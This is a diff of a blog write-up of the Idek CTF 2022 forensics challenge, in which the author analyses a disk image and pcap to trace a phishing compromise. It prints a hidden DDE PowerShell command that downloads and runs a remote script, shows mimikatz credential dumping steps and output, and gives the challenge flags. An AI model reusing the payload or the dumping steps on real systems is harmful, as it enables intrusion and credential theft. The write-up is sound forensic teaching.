@@ -8,7 +8,14 @@ author = ["connar"]
 ## Intro
 This challenge is one of the forensic challenges from the Idek CTF 2022. I wanted to play this for a long time because I had heard that it was really really good, but the links containing it ended up getting expired, so big thanks to the author **bquanman** for providing the chall and giving me the change to play them after 3 years:D
 
-In this challenge we are given a `.pcap` file and a `.vhdx` file. Without having the description, and since the challenge provided a network traffic file and a virtual filesystem, I assumed that something malicious happened and thereafter a pcap was generated to analyze a possibly maliciously established connection/data exfiltration. So I started analyzing the `.vhdx` file.  
+In this challenge we are given a `.pcap` file and a `.vhdx` file and the challenge consists of 3 parts.
+
+The description of the part 1 states as follows:
+```
+We're pretty sure there's been a hack into our system. The incident is suspected to be caused by an employee opening a document file received via email even though he deleted it shortly afterwards. We managed to do a logical acquisition of data from his hard drive. However, when we open the document file, it looks empty, can you analyze what it contains?
+```
+
+This gives out a hint into looking for an email with a malicious attachment, so let's start analyzing the `.vhdx` filesystem to maybe find out such an email.
 
 ## Part 1 - Analyzing initial Access
 To analyze filesystems, usually you will go with Autopsy or FTK Imager. Since I did not have a Raw file or an E01 one, and since I had issues converting the `.vhdx` into one of the forementioned filetypes, I just mounted the provided `.vhdx` (just right click-> Mount) and then loaded the `C:\\` folder of the mounted drive into the logical files of Autopsy, which yielded the result I was looking for:  
@@ -40,7 +47,7 @@ We can see the following dde data:
 ddeService="cmd" ddeTopic="/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\&quot;http://172.21.20.96/windowsupdate.ps1\&quot;);IEX $e"
 ```
 
-If we try to access this IP to download the powershell script, we will not be able to retrieve it as it is no longer available. But we remember that we have the whole filesystem, and thus we probably can retrieve the data of this `windowsupdate.ps1` from the powershell logs of the system. Searching in Autopsy for the IP, we get three hits back:  
+If we try to access this IP to download the powershell script, we will not be able to retrieve it as it is a local IP in which we don't have access to. But we remember that we have the whole filesystem, and thus we probably can retrieve the data of this `windowsupdate.ps1` from the powershell logs of the system. Searching in Autopsy for the IP, we get three hits back:  
 
 ![alt text](/posts/writeups/training/idek2022/autopsy3.png)  
 
@@ -120,9 +127,15 @@ https://pastebin.com/hVCEUK1B
 Visiting this pastebin post, we get the first flag: `idek{MS_ExCel_DyN4m1c_D4ta_ExcH@ng3_1s_3a5y_t0_d3teCt}`!
 
 ## Part 2 - Credential Access and PrivEsc
-After having identified how the initial compromise happened, we can still keep looking at the powershell logs to see if we can spot any further malicious activity by the attacker there.  
+After having identified how the initial compromise happened, we can still keep looking at the powershell logs to see if we can spot any further malicious activity by the attacker there. The description of part 2 helps us again by giving out hints to search for leaked credentials:  
+```
+We suspect multiple accounts were compromised. The attacker moved laterally. Therefore, the credentials that he used to move laterally must have leaked. Let's analyze the sequence of actions taken by the attacker and tell us what he has obtained for later purposes?
 
-To sum up the activity found in the log:
+Note: The flag is wrapped and divided into 2 parts
+```
+So maybe logs will hint out any command related to credentials for lateral movement.
+
+After searching the logs, to sum up the activity found in the log, I gathered the following commands:
 ```
 [+] http://172.21.20.96/windowsupdate.ps1
     [*] Initial Access
@@ -146,9 +159,9 @@ To sum up the activity found in the log:
     [*] Uses net1 (duplicate of net.exe found in System32) to create a new user account with the specified creds in the command.
 ```
 
-From the above commands executed and logged on the powershell logs (`Microsoft-Windows-Sysmon54Operational.evtx`) we can see cear indications of mimikatz usage both in the LSASS being dumped in the `errordump` file but also trying to decrypt credentials found in a possible DPAPI file named `DB79FF0C49C20D542F3690C933AC3046`. We can try to mimic what the attacker did since there is nothing else juicy here to look at. We will dump both files and try to use mimikatz to see what we can find.
+From the above commands executed and logged on the powershell logs (`Microsoft-Windows-Sysmon54Operational.evtx`) we can see clear indications of mimikatz usage both in the LSASS being dumped in the `errordump` file but also trying to decrypt credentials found in a possible DPAPI file named `DB79FF0C49C20D542F3690C933AC3046`. We can try to mimic what the attacker did since there is nothing else juicy here to look at. We will dump both files and try to use mimikatz to see what we can find. After all, mimikatz seems our best chance based on what the description states.
 
-### [Part 1] Mimikatz - error.dmp file
+### [First half of the flag] Mimikatz - error.dmp file
 Starting with the `error.dmp` file, we extract it from Autopsy and put it in the same directory as the `mimikatz.exe` tool - a popular tool used to extract credentials.  
 
 ```
@@ -202,7 +215,7 @@ Authentication Id : 0 ; 95278 (00000000:0001742e)
 ```
 And we spot the first part of the flag as the password of the user `IEUser` we saw multiple times being referenced in the logs: `idek{crEDentia`
 
-### [Part 2] Mimikatz - DB79FF0C49C20D542F3690C933AC3046 possible DPAPI file
+### [Second half of the flag] Mimikatz - DB79FF0C49C20D542F3690C933AC3046 possible DPAPI file
 The other file we saw being manipulated before mimikatz was a file named DB79FF0C49C20D542F3690C933AC3046. We can spot strings like **Local Credential Data**. Searching online what this file is, we can find references to DPAPI. To decrypt these credentials, I followed this article after using `intext:"Local Credential Data Mimikatz"`:
 - https://steemit.com/cmd/@evil0x00/mimikatz-get-local-credentials
 
@@ -373,6 +386,10 @@ Decrypting Credential:
 So the whole flag is: `idek{crEDential_4C3S5_f0R_1@73rAl_mOv3M3n7}`
 
 ## Part 3 - DNS Exfiltration and reconstruction
+The description of the final part states:  
+```
+We tried to collect more network data for analysis, but because of the late approach, we only had data for a short period of time before we detected the attack and performed a shutdown of all machine at about 19:00 UTC. However I hope it can help you to answer the question whether the attacker has access to our important data?
+```
 The previous flag can be used as a hint on how to move on, since we still have a big .pcap we have not touched upon and I already felt a bit lost at this point.  
 
 The flag from part 2 refers to `stealing credentials in order to do lateral movement`. We can also see that the second part of the flag was from a target domain with IP address `192.168.209.134`. Searching this IP address inside `Autopsy` as we previously did, we see logs related to RDP connection:  
